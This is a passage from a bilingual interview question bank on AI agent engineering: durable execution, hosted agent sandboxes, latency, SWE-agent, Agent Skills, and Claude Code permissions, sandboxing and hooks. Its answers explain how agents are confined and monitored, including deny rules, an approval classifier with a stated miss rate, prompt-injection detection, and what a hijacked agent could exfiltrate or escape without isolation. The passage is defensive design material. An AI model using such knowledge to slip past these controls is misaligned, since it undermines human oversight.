> The principle is: externalize the state and make the runner disposable. Every model call and tool call is recorded as an intent and then a result in durable storage, a Postgres-backed checkpointer or a workflow engine's event history. If the process dies, a new worker loads the log, replays completed steps from their recorded results, and continues. That's how Anthropic describes Managed Agents: the session is an append-only event log, and a crashed harness is simply replaced. The harder part is side effects. Every write gets an idempotency key that's persisted before the call, and the downstream service dedupes on it. If I find an intent with no result, I query the target first and only retry with the same key. For multi-hour, cross-service processes I'd use Temporal: completed activities aren't re-executed, the workflow code stays deterministic, and LLM calls live in activities. I'd also persist budgets and a progress summary, so the resumed run doesn't start its accounting or its context from zero.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 下游服务不支持幂等键怎么办？ | 在自己这边加一层写网关：记录键 → 结果；执行前先查目标状态（比如"这个工单评论是否已存在"）。实在做不到的写操作，改成人工确认。 | "I'd put a write gateway in front that records key-to-result and checks target state first; if neither is possible, that action needs human confirmation." |
| 为什么 LLM 调用不能直接写在 Temporal workflow 里？ | workflow 重放时代码会重新执行，LLM 输出每次不同，会破坏确定性；放进 activity，结果会被记录，重放时直接复用。 | "Replay re-executes workflow code, and LLM output isn't deterministic; inside an activity the result is recorded and reused on replay." |

**坑**
- 说"有检查点就能 exactly-once"。LangGraph 会重跑节点，Temporal 的 activity 是至少一次执行，幂等是你自己的责任。
- 写操作超时后让模型"再调一次"。模型可能还改了参数。超时等于"结果未知"，由代码决定能否重试。
- 只恢复执行状态，不恢复上下文。恢复后模型不知道之前做到哪了，又从头规划（planning）一遍。

**来源：** [Anthropic – Scaling Managed Agents: Decoupling the brain from the hands](https://www.anthropic.com/engineering/managed-agents)、[OpenAI – The next evolution of the Agents SDK](https://openai.com/index/the-next-evolution-of-the-agents-sdk/)、[Temporal docs – Workflow Execution](https://docs.temporal.io/workflow-execution)、[LangGraph – Interrupts](https://docs.langchain.com/oss/python/langgraph/interrupts)、[Anthropic – How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)

---

### Q52 · Claude Managed Agents、OpenAI Agents SDK 的 sandbox 这类托管 agent 基础设施解决了什么问题？你会怎么选？ <a id="q52"></a> [↑ 目录](#toc)

**English question:** What problems do hosted agent infrastructure offerings like Claude Managed Agents and the OpenAI Agents SDK sandbox solve, and how would you choose between them and building your own?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 框架、手写循环、还是 Temporal](06-ai-system-design.md#h53) 有"自建 vs 框架 vs 引擎"的取舍；[06 §2.7](06-ai-system-design.md#s2-7) 讲防护。两款托管（managed）产品本题新补。

**答案要点**
1. **它们解决的共同问题**：自建一个长时运行的 agent 需要 agent 循环、工具执行、沙箱（sandbox：隔离的执行环境）、状态持久化、凭证（credentials）隔离、上下文压缩。这些都是重复造轮子，而且容易做错。
2. **Claude Managed Agents**（2026-04 推出 beta，所有接口要带 beta header `managed-agents-2026-04-01`；工程博客 2026-04-08）：
   - 四个概念：Agent（模型、system prompt、工具、MCP 服务器、skills）、Environment（Anthropic 托管的云沙箱，或者你自己的自托管沙箱）、Session（一次运行实例）、Events（双向消息，服务端持久保存）。
   - 架构上把"大脑"（Claude + harness）、"手"（沙箱和工具）、"会话"（事件日志）拆开。容器坏了就当工具调用报错，换一个新的（文中原话是容器变成了 cattle，即可随时替换的牲口，不是要精心照料的宠物）。
   - 凭证不进沙箱：git token 只在初始化时配置 remote；MCP 的 OAuth token 存在 vault 里，由代理去调用外部服务。
   - 容器按需启动后，首 token 时间（TTFT）p50 降约 60%，p95 降超过 90%。
   - 限制：会话是有状态的，所以目前不支持零数据保留（ZDR）和 HIPAA BAA。
3. **OpenAI Agents SDK 更新**（2026-04-15，先出 Python 版，TypeScript 版计划中）：
   - 模型原生的 harness：可配置记忆、感知沙箱的编排、类似 Codex 的文件系统工具，支持 MCP、skills、AGENTS.md、shell、apply patch。
   - 原生沙箱：可以自带，也内置支持 Blaxel、Cloudflare、Daytona、E2B、Modal、Runloop、Vercel。
   - 用 `Manifest` 描述工作区，让环境可以在不同沙箱厂商之间移植。
   - 快照和恢复：容器失效后，在新容器里从最近的检查点继续。
   - 同样强调 harness 和计算分离，让凭证远离模型生成的代码。
4. **怎么选**：
   - 想最快上线、能接受数据存在厂商侧：托管的 Managed Agents。
   - 想自己掌控 harness 代码、在自己的基础设施上运行、可换沙箱厂商：SDK 方式。
   - 需要多模型、强合规（ZDR、数据驻留）、和现有平台（Temporal、内部 IAM）深度集成：自建，或者 SDK 配自托管沙箱。
5. **不管选哪个都不能省的**：权限（permission）和授权仍在你的工具服务端；评测集（eval set）；成本预算；审计日志（audit log）。

**English answer (speakable, ~45–75 s):**
> Both exist because every team building long-running agents rebuilds the same things: the loop, tool execution, a sandbox, durable state, credential isolation and context management. Claude Managed Agents is the fully hosted version: you define an agent, an environment, which can even be a self-hosted sandbox, and you run sessions whose event history is stored server-side. Their architecture splits the brain, the hands and the session log, so a dead container is just a tool error, and credentials never enter the sandbox. The OpenAI Agents SDK update in April 2026 is the library version: a harness with MCP, skills and AGENTS.md support, native sandboxes across providers like E2B, Modal or Cloudflare, a Manifest to describe the workspace portably, and snapshots so a run continues in a fresh container. My choice depends on control and compliance. Managed is fastest to production. The SDK keeps the harness in my code. And if I need zero data retention or deep integration with an existing workflow platform, I'd self-host. Either way, authorization, evals and budgets stay my job.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| "harness 和计算分离"为什么重要？ | 模型生成的代码在沙箱里跑，可能被提示注入控制；凭证放在沙箱外，注入也偷不到。沙箱还能随时替换和横向扩展。 | "Model-generated code runs in the sandbox and may be prompt-injected; keeping credentials outside means injection can't steal them, and sandboxes become replaceable and scalable." |
| 托管方案的锁定风险？ | agent 定义、会话格式都绑定厂商。我会把工具做成 MCP、知识做成 skills 或文档、评测集自己持有，这样迁移只需要重写编排层。 | "Agent and session formats are vendor-specific, so I keep tools as MCP servers, knowledge as skills or docs, and own the eval set; then only orchestration needs rewriting." |

**坑**
- 说 Managed Agents "全部跑在 Anthropic 那边"。Environment 可以是自托管沙箱，但 harness 仍由 Anthropic 运行。
- 说 OpenAI SDK 沙箱"自带隔离（isolation）"。文档提醒：Linux 上的 `UnixLocalSandboxClient` 没有操作系统级隔离，不可信输入要用 Docker 或托管沙箱。
- 把托管当成合规问题的解决方案。Managed Agents 目前不支持 ZDR 和 HIPAA BAA。

**来源：** [Claude Platform docs – Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview)、[Anthropic – Scaling Managed Agents](https://www.anthropic.com/engineering/managed-agents)、[OpenAI – The next evolution of the Agents SDK](https://openai.com/index/the-next-evolution-of-the-agents-sdk/)、[OpenAI Agents SDK – Sandbox agents](https://openai.github.io/openai-agents-python/sandbox_agents/)

---

### Q53 · Agent 服务上线后 p95 延迟 40 秒，用户大量流失，你怎么排查和优化？ <a id="q53"></a> [↑ 目录](#toc)

**English question:** After launch, your agent service has a p95 latency of 40 seconds and users are churning. How do you diagnose and fix it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.9 成本 / 延迟估算](06-ai-system-design.md#s2-9) 有延迟（latency）拆解公式"端到端（end-to-end） ≈ 排队（queueing） + Σ(每轮 TTFT + 输出 token / 解码（decoding）速度) + Σ(串行工具延迟)"；[06 §2.8](06-ai-system-design.md#s2-8) 有模型路由（model routing）、提示缓存（prompt caching）、流式（streaming）、故障切换；[06 §2.10](06-ai-system-design.md#s2-10) 讲 trace。本题按实战流程组织。

**答案要点**
1. **先止血（mitigation，当天就能做）**：
   - **流式输出（streaming）+ 进度展示**：先让用户看到计划和"正在查 X"。体感等待比实际 p95 更影响流失。
   - **整体截止时间（deadline）**：比如 15 秒后返回已有结果加"继续深入"按钮，或者转成异步（asynchronous）任务，完成后通知。
   - **快速路径**：常见简单问题走路由，用小模型（small model）、少轮数，甚至不调 LLM（预计算答案、模板）。
2. **定位**：用 trace 把 p95 那批请求拆成几段：
   - 排队时间（限流（rate limiting）或配额等待）。
   - 每轮首 token 时间（TTFT：从发请求到收到第一个 token）× 轮数。
   - 输出 token 数（含推理 token）÷ 解码速度。
   - 每个工具的延迟，以及工具是串行还是并行调用的。
   - 重试和故障切换次数。
   - **分开看长尾**：p95 往往是"轮数多的那类任务"或"某个慢工具超时重试"，不是平均情况变慢。
3. **常见根因（root cause）**：
   - 轮数太多（模型一个一个串行调工具）。
   - 推理强度（reasoning effort）开得太高，输出 token 太长。
   - 提示缓存没命中（每轮前缀（prefix）有变化，比如 system prompt 里放了时间戳（timestamp））。
   - 慢工具没有超时，或者超时后重试。
   - 大模型处理所有请求。
4. **修复（按收益排序）**：
   - **减少轮数 + 并行**：独立的工具调用一次发出；把常见的多步序列合成一个工具。
   - **少生成 token**：OpenAI 延迟指南说生成 token 几乎总是延迟最高的一步，输出减半，延迟大约减半；所以降推理强度、要求简洁输出。
   - **提示缓存（prompt caching）**：前缀保持稳定。Anthropic 公布的例子是 10 万 token 的缓存提示，TTFT 从 11.5 秒降到 2.4 秒（−79%）。
   - **模型路由**：简单步骤（分类、抽取（extraction））用小模型。
   - **工具侧**：给每个工具设比整体截止时间更短的超时，加缓存，按需预取。
5. **上线指标**：
   - 首个有用内容的时间（time to first useful token）、端到端 p50 / p95 / p99。
   - 每个任务的轮数、缓存命中率（hit rate）。
   - **任务成功率（success rate）不能降**：每个优化都要在评测集上验证质量。
   - 用户侧：放弃率、留存。灰度（canary rollout）发布后对比。
6. **估算（estimation）示例（推算，数字全为假设）**：原来 8 轮 × (TTFT 1.5 秒 + 600 输出 token ÷ 60 token/秒 = 10 秒) + 4 个串行工具 × 2 秒 = 8 × 11.5 + 8 = 100 秒（这是长尾样本）。改成并行工具（8 → 2 秒）、轮数降到 4、输出降到 200 token（≈3.3 秒）、缓存把 TTFT 降到 0.5 秒：4 × 3.8 + 2 ≈ 17 秒。

**English answer (speakable, ~45–75 s):**
> First I'd stop the churn, because perceived latency matters as much as real latency. I'd stream a plan and progress right away, add an overall deadline that returns partial results or moves the task to an async job, and send simple intents down a fast path with a small model. Then I'd break the p95 requests down from traces: queueing, time to first token times the number of turns, output and reasoning tokens divided by decode speed, and each tool's latency, serial or parallel, plus retries. The tail is usually a specific class of request, like one with too many turns or a slow tool that keeps timing out. The fixes, in order of payoff: fewer turns and parallel tool calls; fewer generated tokens, since generation is almost always the slowest step, so lower reasoning effort and concise outputs; a stable prefix so prompt caching hits; routing easy steps to smaller models; and tight per-tool timeouts. I'd ship behind a canary and track p95, turns per task and cache hit rate, while making sure task success on the eval set doesn't drop.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 换小模型后质量掉了怎么办？ | 只把能用评测证明的步骤（分类、抽取、路由）换成小模型；难步骤保留大模型；或者先用小模型，置信度低时升级到大模型。 | "Only move steps that the eval shows a small model can handle, like classification or extraction, and escalate to the large model on low confidence." |
| 为什么缓存会没命中？ | 前缀里有变化的内容（时间戳、用户 ID、工具列表顺序不固定），或者中途改了工具定义。动态内容放到前缀后面。 | "Something in the prefix changes: a timestamp, a user ID, tool order, or edited tool definitions. Dynamic content goes after the stable prefix." |

**坑**
- 只看平均延迟。p95 的问题通常出在特定的一类请求上，要分桶看。
- 一上来就换更快的 GPU 或厂商。大多数 agent 延迟来自轮数和输出长度，不来自单次推理速度。
- 优化后不测质量。砍轮数、降推理强度都可能降低成功率。

**来源：** [OpenAI – Latency optimization guide](https://developers.openai.com/api/docs/guides/latency-optimization)、[Anthropic – Prompt caching（延迟与成本示例表）](https://claude.com/blog/prompt-caching)

## 模块 J：Coding 与 Computer Use Agent <a id="mj"></a> [↑ 目录](#toc)

### Q54 · SWE-agent 提出的 ACI（Agent-Computer Interface）是什么？为什么比直接给模型一个 shell 效果好？ <a id="q54"></a> [↑ 目录](#toc)

**English question:** What is the Agent-Computer Interface (ACI) proposed by SWE-agent, and why does it work better than just giving the model a raw shell?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 工具设计原则](06-ai-system-design.md#s2-3) 的七条原则（一个工具一个稳定问题、结果有预算（budget）、错误分类等）本质上就是 ACI 思路；[06c](06c-ai-sd-question-bank.md) Q3 coding agent 讲沙箱（sandbox）和测试验证。SWE-agent 论文本题新补。

**答案要点**
1. **论文**：Yang 等人《SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering》，Princeton，NeurIPS 2024 主会。
2. **ACI 是什么**：介于语言模型和计算机之间的一层抽象。就像人用 IDE 而不是只用裸终端，作者认为 LM agent 也需要专门为它设计的界面：一组命令，加上命令执行后返回什么反馈。
3. **四条设计原则**：
   - 动作简单易懂：选项少，文档简短。
   - 动作紧凑高效：导航、编辑这类重要操作合并成尽量少的命令。
   - 反馈信息足但简洁：告诉模型当前状态和刚才动作的效果，不堆无关细节。
   - 护栏（guardrails）：内置检查帮模型及早发现错误，比如编辑后自动跑语法检查。
4. **具体做法**：
   - 文件查看器一次最多显示 100 行，可以上下滚动和跳转。
   - 搜索命令最多返回 50 条结果；超过就不返回，让模型写更具体的查询。
   - 编辑命令会先过 linter（语法检查），有语法错误就拒绝这次编辑，并告诉模型错在哪。
5. **效果（SWE-bench Lite，GPT-4 Turbo）**：
   - SWE-agent 解决 18.0%，只给 shell 的基线（baseline）解决 11.0%（相对提升约 64%）。
   - 消融实验（ablation：去掉某个组件看效果掉多少）：去掉编辑时的 linter，从 18.0% 降到 15.0%。
   - 搜索方式：汇总式搜索 18.0%，迭代式搜索 12.0%，不给搜索 15.7%。说明"界面设计不好"比"不给这个工具"还差。
   - 在完整 SWE-bench 上 pass@1 为 12.5%（当时最好成绩）。
6. **今天的意义**：这些数字已经过时，但原则没过时。工具设计就是给模型做产品设计；今天 Claude Code、Codex 的文件编辑工具、带行号的读取、apply patch 都是同一思路。

**English answer (speakable, ~45–75 s):**
> ACI stands for agent-computer interface. The SWE-agent paper from Princeton, at NeurIPS 2024, argued that language models need an interface designed for them, the way humans use IDEs instead of a bare terminal. They had four principles: simple actions with short documentation; compact actions, so navigation and editing take few steps; concise but informative feedback; and guardrails that catch mistakes early. Concretely, the file viewer shows a hundred lines at a time, search caps results at fifty and asks for a narrower query beyond that, and edits are linted and rejected if they introduce a syntax error. On SWE-bench Lite with GPT-4 Turbo, that took them from 11% with a plain shell to 18%. Removing the linter alone dropped them to 15%, and a badly designed iterative search was worse than no search at all. The numbers are old now, but the lesson holds: tool design is product design for the model, and it's often a bigger lever than the prompt.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 你自己设计工具时怎么用这些原则？ | 结果有条数和字节上限，截断要明说并给游标；错误要分类，不能变成空结果；写操作前做校验，校验不过直接返回原因。 | "Bounded results with explicit truncation and a cursor, typed errors instead of empty results, and validation before writes that returns the reason on failure." |
| 为什么限制搜索结果反而更好？ | 结果太多会挤占上下文，模型容易在噪声里迷失；让它缩小查询，反而更快找到目标。 | "Too many results flood the context and the model gets lost; forcing a narrower query finds the target faster." |

**坑**
- 把 ACI 说成"给模型一个更好的 prompt"。它是工具和反馈格式的设计，不是 prompt。
- 拿 12.5% 或 18% 去和今天的模型分数比较。基准（benchmark）版本（Lite 还是完整版，Verified 还是 Pro）和年代都不同。

**来源：** [arXiv 2405.15793 – SWE-agent](https://arxiv.org/abs/2405.15793)、[arXiv HTML（设计原则、消融表）](https://arxiv.org/html/2405.15793)、[NeurIPS 2024 proceedings](https://papers.neurips.cc/paper_files/paper/2024/hash/5a7c947568c1b1328ccc5230172e1e7c-Abstract-Conference.html)

---

### Q55 · Agent Skills 是什么？渐进式披露是怎么做的？它和 MCP 是什么关系？ <a id="q55"></a> [↑ 目录](#toc)

**English question:** What are Agent Skills, how does progressive disclosure work, and how do Skills relate to MCP?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 研究案例](06-ai-system-design.md#h20) 有 SkillWeaver 式"技能库"（把成功轨迹（trajectory）存成带参数的函数），和 Agent Skills 是不同的东西；[08 三道 Agent 设计练习](notes/08-design-exercises.md) 练习 2 也是 SkillWeaver。Agent Skills 规范本题新补。

**答案要点**
1. **时间线**：Anthropic 2025-10-16 发布 Agent Skills；2025-12-18 作为开放标准发布，规范放在 agentskills.io。OpenAI Agents SDK 2026-04 的更新也支持 skills（原文说用 skills 实现"渐进式披露（progressive disclosure）"），说明已经跨厂商（vendor）。
2. **Skill 是什么**：一个文件夹，至少有一个 `SKILL.md`，里面是 YAML 头信息（frontmatter）加 Markdown 指令；可选 `scripts/`（可执行代码）、`references/`（参考文档）、`assets/`（模板、数据）。
   - 必填字段：`name`（最多 64 个字符，小写字母、数字、连字符，必须和目录名一致）、`description`（最多 1024 个字符，写清做什么、什么时候用）。
   - 可选字段：`license`、`compatibility`、`metadata`，以及实验性的 `allowed-tools`。
3. **渐进式披露（progressive disclosure：先只给目录，用到时再给细节）分三层**：
   - 第 1 层元数据（metadata）：启动时只把每个 skill 的 `name` + `description` 放进 system prompt，每个约 100 token。
   - 第 2 层指令：模型判断相关时，才读入整个 `SKILL.md`。规范建议正文少于 5,000 token、不超过 500 行。
   - 第 3 层资源：`scripts/`、`references/` 里的文件只在需要时才读或执行。脚本可以直接运行，代码本身不用进上下文（context）；代码是确定性（deterministic）的，所以同样的流程每次结果一致。
   - 效果：可以装几十个 skill，平时只占很少的上下文。
4. **和 MCP 的关系：互补，不是替代**：
   - MCP（Model Context Protocol）是**连接协议**：让 agent 能调用外部系统的工具、读外部数据，需要一个运行中的服务。
   - Skill 是**程序性知识**（procedural knowledge：怎么一步步做一件事）的打包格式：就是文件，教 agent 用已有的工具完成某类工作，比如"按公司模板做季度报告"。
   - 一个 skill 的指令里可以写"用某个 MCP 工具查数据，再跑这个脚本"。MCP 给手，skill 给做事的方法。
5. **安全**：skill 里可能带脚本，也可能写着"去连某个外部地址"，所以只从可信来源安装，装之前审查里面的代码、依赖和网络访问。恶意（malicious） skill 可以引导 agent 泄露数据。

**English answer (speakable, ~45–75 s):**
> A skill is just a folder with a SKILL.md file: a short YAML header with a name and a description, then Markdown instructions, plus optional scripts, reference docs and assets. Anthropic introduced it in October 2025 and published it as an open standard in December, and OpenAI's Agents SDK now supports skills too. The key idea is progressive disclosure. At startup the agent sees only each skill's name and description, roughly a hundred tokens each. When a task matches, it reads the full SKILL.md. And only if needed does it open the reference files or run the bundled scripts, often without the script's code ever entering the context. So you can install many skills at almost no context cost. Compared with MCP: MCP is a protocol that connects the agent to external tools and data through a running server; a skill packages procedural knowledge, how to do a kind of task, and it can tell the agent which MCP tools to use. They're complementary. And because skills can contain code, I treat installing one like installing a dependency: trusted sources only, and audit it first.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| skill 选不中怎么办？ | 选择完全靠 `description`，所以要写清"做什么 + 什么时候用"和关键词；用一组样例任务测触发率，像测工具选择准确率一样。 | "Selection depends entirely on the description, so it must say what and when with the right keywords, and I'd measure trigger rate on sample tasks like tool-selection accuracy." |
| 什么时候做成 skill，什么时候做成 MCP 工具？ | 需要访问外部系统、要鉴权、要实时数据：MCP。是"做法"、模板、确定性脚本、只需要本地文件：skill。 | "If it needs an external system, auth or live data, it's an MCP tool; if it's know-how, templates or a deterministic local script, it's a skill." |

**坑**
- 把 Agent Skills 和 SkillWeaver 式"技能库"混为一谈。后者是 agent 自己把成功轨迹提炼成函数；前者是人写的、可分发的知识包。
- 说"skills 取代了 MCP"。官方说法是互补。
- 把 skill 当作无害的文档。它可以带脚本，是供应链（supply chain）风险。

**来源：** [Anthropic – Equipping agents for the real world with Agent Skills](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills)、[Agent Skills specification](https://agentskills.io/specification)、[OpenAI – The next evolution of the Agents SDK](https://openai.com/index/the-next-evolution-of-the-agents-sdk/)

---

### Q56 · Claude Code 的权限和沙箱是怎么设计的？hooks 能拿来做什么？ <a id="q56"></a> [↑ 目录](#toc)

**English question:** How are Claude Code's permissions and sandboxing designed, and what can you use hooks for?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 越权工具调用](06-ai-system-design.md#h33) 讲服务端（server-side）授权（authorization）；[06 §2.7](06-ai-system-design.md#s2-7) 讲防护分层；[06c](06c-ai-sd-question-bank.md) Q3 有"沙箱：无生产凭证（credentials）、出网（egress）白名单（allowlist）、只写工作区"。Claude Code 的具体设计本题新补。

**答案要点**
1. **两层，互补**：
   - **权限规则（permissions）**决定一个工具调用（tool call）能不能执行，覆盖所有工具（Read、Edit、Bash、WebFetch、MCP）。
   - **沙箱（sandbox）**限制一个已经在跑的命令能访问什么，只覆盖 Bash 类命令和它们的子进程。
   - 文件工具、MCP 服务器、hooks 都在沙箱之外运行，所以两层缺一不可。
2. **权限规则**：
   - 三类：`allow`、`ask`、`deny`。**按 deny → ask → allow 的顺序匹配**，第一个命中的决定结果；allow 不能在 deny 里开例外。
   - 规则写法如 `Bash(npm run test *)`、`Read(./.env)`。
   - 模式：default（Manual，首次使用就问）、acceptEdits、plan（只读探索）、auto（后台分类器（classifier）审查）、dontAsk（该问的一律拒绝）、bypassPermissions。
   - 管理员可以用托管设置（managed settings）下发规则，任何其他层都覆盖不了，还可以禁用 bypass 和 auto 模式。
   - 文档明确：权限由 Claude Code 强制执行，不由模型执行；写在 prompt 或 CLAUDE.md 里的约束改变不了权限。
3. **沙箱（2025-10-20 工程博客）**：
   - 用操作系统原语实现：macOS 用 Seatbelt，Linux 用 bubblewrap。
   - 文件系统：默认只能写工作目录（加上临时目录和显式添加的目录）；`.claude` 设置等受保护路径即使在工作目录里也禁止写。
   - 网络：所有流量走本机代理，按 `allowedDomains` 白名单放行，白名单默认为空。
   - 为什么两个都要：只隔离（isolation）网络，被劫持的 agent 能改系统文件逃出去；只隔离文件系统，它能把 SSH key 发出去。
   - 效果：Anthropic 内部使用中，沙箱让权限弹窗减少 84%。弹窗太多会导致"审批（approval）疲劳"，用户不看就点同意。
4. **auto 模式（2026-03-25）**：用户本来就会同意约 93% 的手动弹窗，于是改用两阶段分类器审查每个动作。分类器看不到工具输出（防止被注入内容影响），工具输出另由提示注入（prompt injection）探测器扫描。公开的漏判率（false negative）是 17%，所以它不能替代沙箱。连续 3 次或累计 20 次被拦，就交给人处理。
5. **hooks 能做什么**：在固定事件上运行你的命令，事件包括 `PreToolUse`、`PostToolUse`、`UserPromptSubmit`、`Stop`、`SubagentStop`、`SessionStart`、`PreCompact` 等。`PreToolUse` 退出码 2 表示拦下这次调用（退出码 1 不拦），也可以返回 `permissionDecision`（allow / deny / ask），或者用 `updatedInput` 改写参数。典型用途：
   - 拦危险命令（`rm -rf`、生产库连接串）。
   - 编辑后自动跑格式化和 lint（`PostToolUse`）。
   - `Stop` 时检查测试是否通过，没过就不让结束。
   - 写审计日志（audit log）、发通知。
   - 会话（session）开始时注入上下文（比如当前分支、工单（ticket））。
   - 注意：hook 返回 allow 不会绕过 deny 规则；硬性的允许和禁止应该用权限系统。

**English answer (speakable, ~45–75 s):**
> It's two complementary layers. Permission rules decide whether a tool call may run at all, for every tool, including file edits, web fetches and MCP. Rules are allow, ask or deny, evaluated deny first, so an allow can't carve a hole in a deny, and admins can push managed rules nobody can override. Importantly, they're enforced by the harness, not by the model, so a prompt can't talk its way past them. The sandbox limits what a running shell command can touch, using Seatbelt on macOS and bubblewrap on Linux: writes only in the working directory, and network only through a proxy with a domain allowlist. You need both, because without network isolation a hijacked agent can exfiltrate keys, and without filesystem isolation it can escape. Anthropic reported the sandbox cut permission prompts by 84% internally, which matters because approval fatigue is a real risk. Hooks are deterministic code at lifecycle events. I'd use PreToolUse to block dangerous commands with exit code 2, PostToolUse to run formatters and linters, and a Stop hook that refuses to finish until tests pass.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 为什么不全靠 auto 模式的分类器？ | 分类器是概率性的，公开漏判率 17%；沙箱和 deny 规则是确定性的边界。分类器用来减少弹窗，不当最后一道防线。 | "The classifier is probabilistic, with a published 17% false-negative rate on overeager actions; the sandbox and deny rules are deterministic. The classifier reduces prompts, it isn't the last line of defense." |
| hook 本身安全吗？ | hook 以你的用户权限运行，在沙箱之外。项目里的 hook 配置相当于可执行代码，要像审代码一样审查。 | "Hooks run with your user permissions, outside the sandbox, so a project's hook config is executable code and needs review like code." |

**坑**
- 说"在 CLAUDE.md 里写'不要删文件'就是权限控制"。文档明确说指令改变不了权限。
- 以为沙箱覆盖所有工具。它只管 Bash 类命令；文件工具和 MCP 靠权限规则。
- 用 `exit 1` 想拦截。只有退出码 2 才是阻断；1 是非阻断错误，调用照常执行。

**来源：** [Claude Code docs – Permissions](https://code.claude.com/docs/en/permissions)、[Claude Code docs – Sandboxing](https://code.claude.com/docs/en/sandboxing)、[Claude Code docs – Hooks](https://code.claude.com/docs/en/hooks)、[Anthropic Engineering – Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)、[Anthropic – Claude Code auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode)

---

### Q57 · OpenAI 说内部一个小团队用 Codex 写了约 100 万行代码、零行手写。他们提出的 harness engineering 是什么？你怎么看？ <a id="q57"></a> [↑ 目录](#toc)

**English question:** OpenAI said a small internal team shipped roughly a million lines of code with Codex and zero hand-written lines. What is the "harness engineering" they describe, and what do you make of it?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 两者是什么、什么关系](06-ai-system-design.md#h49) 的名词解释定义了 agent harness（组织上下文、模型调用、工具执行、状态和终止条件的运行层）；[06c](06c-ai-sd-question-bank.md) Q3 讲"验证器（verifier）越可靠，越敢给 agent 自主权"。这篇文章本题新补。

**答案要点**
1. **原文事实**（Ryan Lopopolo，2026-02-11）：
   - 空仓库（repository）的第一次提交在 2025 年 8 月下旬，五个月后仓库里约有一百万行代码，全部由 Codex 写（应用、测试、CI、文档、可观测性（observability）、内部工具）。
   - 约 1,500 个 PR 被创建并合并；开始是 **3 名工程师**驱动 Codex，平均每人每天 3.5 个 PR；团队后来扩到 **7 人**，吞吐（throughput）还在上升。
   - 他们估计用时约为手写的 1/10。
   - 口号：Humans steer. Agents execute.（人掌方向，agent 执行。）
2. **harness engineering 的核心做法**：
   - **给地图，不给千页手册**：AGENTS.md 只有约 100 行，当目录用；真正的知识在结构化的 `docs/` 目录里（设计文档、执行计划、技术债清单），作为唯一权威来源（system of record）。
   - **机械化地强制执行**：用 linter 和 CI 检查文档是否最新、是否互相链接；有一个定期运行的 "doc-gardening" agent 发 PR 修过时文档。
   - **架构约束写成代码**：每个业务域按固定分层，只允许向前依赖（Types → Config → Repo → Service → Runtime → UI），由自定义 linter 和结构测试强制；lint 报错信息里直接写修复方法，相当于给 agent 的提示。
   - **让应用对 agent 可读**：每个 git worktree 能单独启动应用；接入 Chrome DevTools Protocol 看 DOM 和截图（screenshot）；本地临时可观测性栈，可以用 LogQL / PromQL 查日志（logs）和指标。单次 Codex 运行常常连续做一个任务超过 6 小时。
   - **垃圾回收**：以前每周五（20% 的时间）人工清理 "AI slop"；后来把"黄金原则"写进仓库，由后台 Codex 任务定期扫描偏差（drift）、发小的重构 PR。
   - **评审大多由 agent 对 agent 完成**，合并门槛刻意放低。
3. **我的看法**：
   - 可迁移的经验：工程师的工作变成设计环境、写清意图（intent）、搭反馈回路；agent 失败时问"缺什么能力，怎么让它对 agent 可读、可强制执行"，而不是"再试一次"。
   - 要打折扣的地方：
     - 这是全新项目（greenfield）、内部产品；
     - 合并门槛低，原文自己说在低吞吐环境里这样做是不负责任的；
     - 行数不是质量指标；
     - 原文明确说这种端到端（end-to-end）能力依赖这个仓库特有的结构和工具，不应假设可以直接推广。

**English answer (speakable, ~45–75 s):**
> The post is from February 2026. A team that started with three engineers and grew to seven built an internal product over five months with zero hand-written code: about a million lines and around fifteen hundred merged PRs, roughly three and a half PRs per engineer per day. The interesting part isn't the line count; it's what they call harness engineering. The engineers' job became designing the environment for the agent. AGENTS.md is a hundred-line map pointing into a structured docs folder that's the system of record. Architecture rules, like allowed dependency directions between layers, are enforced by custom linters whose error messages tell the agent how to fix the problem. The app, its logs and its metrics are made legible to the agent per worktree. And background agents continuously clean up drift, like garbage collection. What I take from it: when an agent fails, ask what capability or constraint is missing and encode it mechanically. What I'd discount: it's greenfield, merge gates were deliberately minimal, and they say themselves it shouldn't be assumed to generalize.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 放到你们的老代码库能照搬吗？ | 不能直接照搬。先做低风险的部分：短 AGENTS.md + docs 索引、把架构规则写成 lint、让测试和日志对 agent 可读；合并门槛保持原样。 | "Not directly. I'd start with the low-risk parts: a short AGENTS.md pointing to docs, architecture rules as lints, tests and logs the agent can read, while keeping our merge gates." |
| 怎么衡量这种做法是否成功？ | 不看行数，看前置时间（lead time）、变更失败率、回滚率、缺陷逃逸率、人工评审时间，以及 agent PR 的合并率。 | "Not lines of code: lead time, change failure rate, rollbacks, escaped defects, human review time, and agent PR acceptance rate." |

**坑**
- 帖子说"5 个人"，与原文不一致：原文是**3 名工程师起步，后来扩到 7 人**。约 100 万行、5 个月与原文一致。
- 说"OpenAI 证明了 agent 可以替代工程师"。原文说人始终在环路中，只是工作的抽象层次变了。
- 把"最少合并门槛"当最佳实践推荐。原文说这只在 agent 吞吐远超人工注意力（attention）的环境里成立。

**来源：** [OpenAI – Harness engineering: leveraging Codex in an agent-first world](https://openai.com/index/harness-engineering/)

---

### Q58 · 设计一个自动修复 GitHub issue 并提 PR 的 coding agent 系统 <a id="q58"></a> [↑ 目录](#toc)

**English question:** Design a coding agent system that automatically picks up GitHub issues, fixes them, and opens pull requests. Cover components, sandboxing, verification, the PR flow, and limits.
（难度：实战 · 系统设计 · 题目后半句按截断前文补全）

